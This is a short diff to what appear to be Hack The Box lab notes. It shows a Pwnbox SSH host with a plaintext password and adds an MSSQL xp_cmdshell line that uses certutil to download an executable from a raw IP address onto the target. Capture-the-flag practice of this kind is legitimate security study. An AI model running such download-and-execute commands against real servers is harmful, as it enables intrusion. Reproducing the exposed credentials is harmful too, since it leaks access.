@@ -1,7 +1,9 @@
 # PWNbox ssh
 ```
 htb-ac-1444035@htb-pmuseptgcc.htb-cloud.com
-y2BDp1p8 
+y2BDp1p8
+
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://95.111.254.81/jp.exe C:\Users\Public\jp.exe';
 ```
 # Nmap
 
